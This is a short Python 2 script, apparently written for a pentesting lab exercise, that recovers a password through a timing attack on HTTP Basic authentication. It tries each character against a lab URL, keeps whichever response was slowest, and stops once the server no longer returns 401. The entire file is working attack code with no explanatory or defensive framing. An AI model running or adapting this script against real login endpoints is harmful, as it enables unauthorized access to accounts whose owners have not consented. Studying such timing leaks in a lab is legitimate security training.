#!/usr/local/bin/python

import sys
import requests
import base64
import string

#print "First argument is " + str(sys.argv[1])

url = 'http://172.20.0.101/authentication/example2/'
charseq = list(string.ascii_lowercase + "0123456789")
password = "p4ssw0r"

def brute(word):
    max_exec_time = 0.0
    suggested_char = "a"
    for char in charseq:
        print "String attempted: " + word + char
        auth_string = "Basic " + base64.b64encode("hacker:" + word + char)
        hdrs = {"Encoding": "gzip, deflate", "Authorization": auth_string}
        r = requests.get(url, headers=hdrs)
        exec_time = r.elapsed.total_seconds()
        print "Char: " + char + " - " + str(exec_time)
        #print "Current time: " + str(exec_time)
        #print "Max time: " + str(max_exec_time)
        if exec_time > max_exec_time:
            #print "More!"
            max_exec_time = exec_time
            suggested_char = char
        if r.status_code != 401:
            print r.status_code
            return (suggested_char, True)

    return (suggested_char, False)

while True:
    print "Guessed so far: " + password
    ch = brute(password)
    password += ch[0]
    if ch[1] == True: break

print password
#print resp.read()
